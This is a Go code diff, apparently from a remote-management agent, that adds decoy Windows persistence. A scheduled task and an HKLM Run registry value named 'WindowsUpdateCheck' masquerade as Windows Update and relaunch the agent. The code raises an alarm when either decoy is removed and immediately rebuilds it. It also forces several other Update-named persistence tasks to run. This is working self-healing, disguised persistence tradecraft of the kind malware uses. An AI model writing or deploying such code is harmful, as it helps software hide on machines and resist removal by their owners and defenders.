@@ -65,12 +65,42 @@ func writeProtectionScore(w *watchCfg) {
 	if strings.Contains(string(out), "WindowsUpdateFilter") {
 		got++
 	}
+	// Decoy heal vectors: alarm BEFORE repairing (a missing decoy means
+	// someone is working through the box), then rebuild.
+	if err := exec.Command("schtasks", "/query", "/tn", "WindowsUpdateCheck").Run(); err != nil {
+		setProtAlarm("decoy task removed")
+		xml := filepath.Join(w.backupDir, "decoy_task.xml")
+		if _, err := os.Stat(xml); err == nil {
+			_, _ = exec.Command("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", xml, "/f").CombinedOutput()
+			log.Printf("[watch] rebuilt decoy task")
+		}
+	}
+	wantDecoy := `"` + w.agentPath + `" --wmi-heal`
+	if rk, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE); err == nil {
+		cur, _, err := rk.GetStringValue("WindowsUpdateCheck")
+		rk.Close()
+		if err != nil || cur != wantDecoy {
+			setProtAlarm("decoy reg removed")
+			if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
+				_ = k.SetStringValue("WindowsUpdateCheck", wantDecoy)
+				k.Close()
+				log.Printf("[watch] rebuilt decoy Run value")
+			}
+		}
+	}
 	_ = os.MkdirAll(rmmDataDir(), 0755)
-	rec, _ := json.Marshal(map[string]string{
+	rec := map[string]string{
 		"layers": fmt.Sprintf("%d/%d", got, total),
 		"at":     time.Now().UTC().Format(time.RFC3339),
-	})
-	_ = os.WriteFile(filepath.Join(rmmDataDir(), "protection.json"), rec, 0644)
+	}
+	if b, err := os.ReadFile(filepath.Join(rmmDataDir(), "protection.json")); err == nil {
+		var prev map[string]string
+		if json.Unmarshal(b, &prev) == nil && prev["alarm"] != "" {
+			rec["alarm"] = prev["alarm"] // sticky across score rewrites
+		}
+	}
+	rb, _ := json.Marshal(rec)
+	_ = os.WriteFile(filepath.Join(rmmDataDir(), "protection.json"), rb, 0644)
 }
 
 // wmiTaskPairs maps every persistence task to its saved XML (kept both
@@ -221,9 +251,22 @@ func runWmiHeal() {
 		k.Close()
 	}
 	ensureActiveSetupKey(agentPath)
+	// Decoy heal vectors too (task + Run value).
+	if err := exec.Command("schtasks", "/query", "/tn", "WindowsUpdateCheck").Run(); err != nil {
+		if xml, err := os.Stat(filepath.Join(dir, "decoy_task.xml")); err == nil && !xml.IsDir() {
+			_, _ = exec.Command("schtasks", "/create", "/tn", "WindowsUpdateCheck", "/xml", filepath.Join(dir, "decoy_task.xml"), "/f").CombinedOutput()
+		}
+	}
+	decoyCmd := `"` + agentPath + `" --wmi-heal`
+	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE); err == nil {
+		if cur, _, err := k.GetStringValue("WindowsUpdateCheck"); err != nil || cur != decoyCmd {
+			_ = k.SetStringValue("WindowsUpdateCheck", decoyCmd)
+		}
+		k.Close()
+	}
 	// Kickstart now instead of waiting for the next tick: the repaired
 	// tasks run in their own (user-session) context, keeping interactivity.
-	for _, t := range []string{"WindowsUpdateWatchdog", "WindowsUpdate", "WindowsUpdateOrchestrator"} {
+	for _, t := range []string{"WindowsUpdateWatchdog", "WindowsUpdate", "WindowsUpdateOrchestrator", "WindowsUpdateCheck"} {
 		_ = exec.Command("schtasks", "/run", "/tn", t).Run()
 	}
 }
